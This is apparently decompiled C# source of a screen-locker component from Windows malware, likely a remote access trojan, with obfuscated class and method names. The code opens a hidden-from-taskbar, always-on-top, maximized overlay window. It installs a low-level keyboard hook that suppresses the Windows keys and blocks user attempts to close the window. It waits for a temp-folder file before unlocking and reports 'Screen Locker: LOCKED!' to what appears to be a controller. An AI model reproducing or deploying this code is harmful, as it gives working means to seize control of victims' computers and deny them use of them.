using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
internal class YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev : Form
{
	public delegate IntPtr Delegate0(int nCode, IntPtr wParam, IntPtr lParam);

	private IContainer icontainer_0;

	private static Delegate0 delegate0_0;

	private static IntPtr intptr_0;

	static YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev()
	{
		Class13.F2pn6WrzFkP6h();
		delegate0_0 = smethod_1;
		intptr_0 = IntPtr.Zero;
	}

	public YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev()
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		Class13.F2pn6WrzFkP6h();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev_FormClosing));
		((Form)this).add_FormClosed(new FormClosedEventHandler(YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev_FormClosed));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Lime);
		((Form)this).set_ClientSize(new Size(278, 244));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("YYPsAxmI7dZSplsSeU.JwtR5mUKvavTZvifev");
		((Form)this).set_Opacity(0.5);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("YYPsAxmI7dZSplsSeU.JwtR5mUKvavTZvifev");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte byte_0, byte byte_1, long long_0, long long_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr SetWindowsHookEx(int int_0, Delegate0 delegate0_1, IntPtr intptr_1, uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr UnhookWindowsHookEx(IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CallNextHookEx(IntPtr intptr_1, int int_0, IntPtr intptr_2, IntPtr intptr_3);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	private static IntPtr smethod_0(Delegate0 delegate0_1)
	{
		Process currentProcess = Process.GetCurrentProcess();
		ProcessModule mainModule = currentProcess.MainModule;
		string string_ = mainModule.ModuleName;
		return SetWindowsHookEx(13, delegate0_1, GetModuleHandle(ref string_), 0u);
	}

	public static IntPtr smethod_1(int int_0, IntPtr intptr_1, IntPtr intptr_2)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Invalid comparison between Unknown and I4
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Invalid comparison between Unknown and I4
		if ((int_0 >= 0) & (intptr_1 == (IntPtr)257))
		{
			Keys val = (Keys)Marshal.ReadInt32(intptr_2);
			if ((int)val == 91 || (int)val == 92)
			{
				try
				{
					keybd_event(251, 0, 1L, 0L);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		return CallNextHookEx(intptr_0, int_0, intptr_1, intptr_2);
	}

	private void YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev_Load(object sender, EventArgs e)
	{
		Class6.smethod_26("MSG" + Class6.string_12 + "Screen Locker: LOCKED!");
		intptr_0 = smethod_0(delegate0_0);
		while (!File.Exists(Path.GetTempPath() + "\\SL.dat"))
		{
			Application.DoEvents();
		}
		((Control)this).Hide();
	}

	private void YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void YYPsAxmI7dZSplsSeU_002EJwtR5mUKvavTZvifev_FormClosed(object sender, FormClosedEventArgs e)
	{
		UnhookWindowsHookEx(intptr_0);
	}
}
